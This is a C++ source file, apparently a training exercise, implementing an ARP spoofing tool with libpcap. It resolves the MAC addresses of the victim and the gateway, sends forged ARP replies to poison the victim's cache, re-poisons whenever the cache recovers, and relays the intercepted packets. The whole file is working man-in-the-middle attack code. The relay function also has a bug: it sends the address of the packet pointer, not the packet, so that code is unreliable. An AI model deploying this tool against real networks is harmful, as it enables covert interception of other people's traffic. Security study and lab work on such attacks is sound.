#include "my-func.h"

Attacker attacker;

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void resolve_attacker_info(char* interface){
    // Reference: https://pencil1031.tistory.com/66
    uint8_t mac[6];
    char ip[40];

    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0){
        fprintf(stderr, "Fail to get interface MAC address - socket() failed - %m\n");
        exit(-1);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(sock, SIOCGIFADDR, &ifr)<0){
        fprintf(stderr, "Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
        close(sock);
        exit(-1);
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, sizeof(struct sockaddr));

    close(sock);

    attacker.mac = Mac(mac);
    attacker.ip = Ip(ip);
}

Mac resolve_mac(pcap_t* handle, Ip& target){
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(attacker.ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(target);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        EthArpPacket* reply = (EthArpPacket*)packet;
        if (reply->eth_.type() != EthHdr::Arp) continue;
        if (reply->arp_.op() != ArpHdr::Reply) continue;
        if (reply->arp_.sip() != target) continue;

        return Mac(reply->arp_.smac());
    }
}

void infect(pcap_t* handle, Flow& flow){
    EthArpPacket packet;

    packet.eth_.dmac_ = flow.smac;
    packet.eth_.smac_ = attacker.mac;

    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attacker.mac;
    packet.arp_.sip_ = htonl(flow.tip);
    packet.arp_.tmac_ = flow.smac;
    packet.arp_.tip_ = htonl(flow.sip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

bool is_spoofed_ip(const u_char* packet, Flow& flow){
    PEthHdr eth_hdr = (PEthHdr)packet;
    if (eth_hdr->type() != EthHdr::Ip4) return false;
    if (eth_hdr->smac() != flow.smac) return false;

    PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
    if (ip_hdr->dip_ != flow.tip) return false;
    return true;
}
// target recover
bool is_recover(const u_char* packet, Flow& flow){
    PEthHdr eth_hdr = (PEthHdr)packet;
    if (eth_hdr->type() != EthHdr::Arp) return false;
    if (eth_hdr->smac() != flow.smac) return false;

    PArpHdr arp_hdr = (PArpHdr)(packet + sizeof(EthHdr));
    if (arp_hdr->tip() != flow.tip) return false;
    return true;
}

void relay(pcap_t* handle, const u_char* packet, Flow& flow){
    PEthHdr eth_hdr = (PEthHdr)packet;
    eth_hdr->smac_ = attacker.mac;
    eth_hdr->dmac_ = flow.tmac;

    PIpHdr ip_hdr = (PIpHdr)(packet + sizeof(EthHdr));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthHdr)+ip_hdr->tlen()); //naver size...
    if (res != 0){
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(-1);
    }
}

void arp_spoof(pcap_t* handle, Flow& flow){
    infect(handle, flow);
    printf("[%d] Sender infected!\n", flow.key);

    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK){
            fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            exit(-1);
        }
        if (is_recover(packet, flow)){
            infect(handle, flow);
            printf("[%d] detect recover :: reinfect\n", flow.key);
        } else if (is_spoofed_ip(packet, flow)) {
            relay(handle, packet, flow);
            printf("[%d] detect spoofed IP :: relay\n", flow.key);
        }
    }
}

void task(char* dev, Flow& flow){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    flow.smac = resolve_mac(handle, flow.sip);
    flow.tmac = resolve_mac(handle, flow.tip);

    printf("[%d] Sender MAC: %s\n", flow.key, std::string(flow.smac).c_str());
    printf("[%d] Target MAC: %s\n", flow.key, std::string(flow.tmac).c_str());
    arp_spoof(handle, flow);

    pcap_close(handle);
}
